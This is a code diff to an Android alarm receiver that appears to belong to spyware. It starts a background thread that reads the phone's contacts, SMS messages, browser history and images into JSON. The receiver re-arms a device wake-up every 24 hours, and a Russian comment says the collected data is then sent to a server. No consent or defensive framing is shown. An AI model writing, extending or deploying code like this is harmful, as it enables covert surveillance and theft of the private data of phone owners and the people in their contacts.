@@ -41,15 +41,30 @@ public class AlarmReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         // TODO: This method is called when the BroadcastReceiver is receiving
         try {
+final Context context1 = context;
+            //запускаем поток для сбора данных
+            //устраняем проблему загрузки файлов во время их создания
+            Thread dataCollection = new Thread("AlarmReceiver") {
+                @Override
+                public void run() {
+                    try {
+                        ReadContacts contact = new ReadContacts(context1);
+                        BrowserHistory browser = new BrowserHistory(context1, context1.getContentResolver());
+                        ReadSms sms = new ReadSms(context1, context1.getContentResolver());
+                        sms.smsToJson();
+                        contact.getContacts();
+                        browser.historyToJson();
+                        saveIMAGE(context1, context1.getContentResolver());
+                    } catch (Exception e) {
+                        Log.i(Msg, "Error AlarmReceiver run "+e);
+                    }
+                }
+            };
 
-            ReadContacts contact = new ReadContacts(context);
-            BrowserHistory browser = new BrowserHistory(context, context.getContentResolver());
-            ReadSms sms = new ReadSms(context, context.getContentResolver());
-            sms.smsToJson();
-            contact.getContacts();
-            browser.historyToJson();
-            saveIMAGE(context, context.getContentResolver());
+            dataCollection.start();
+            dataCollection.join();
 
+            
             AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
             Intent myIntent = new Intent(context, AlarmReceiver.class);
             PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, myIntent, 0);
@@ -62,7 +77,7 @@ public class AlarmReceiver extends BroadcastReceiver {
                 alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 60 * 24, pendingIntent);
             }
 
-            EventBus.getDefault().post(new EventBusData("allfile"));// если есть коннект пробуем отправить новые данные на сервер
+            EventBus.getDefault().post(new EventBusData("all_file"));// если есть коннект пробуем отправить новые данные на сервер
         }catch (Exception e){Log.i(Msg, "Error AlarmReceiver onReceive "+e);}
     }
     //IMEGE
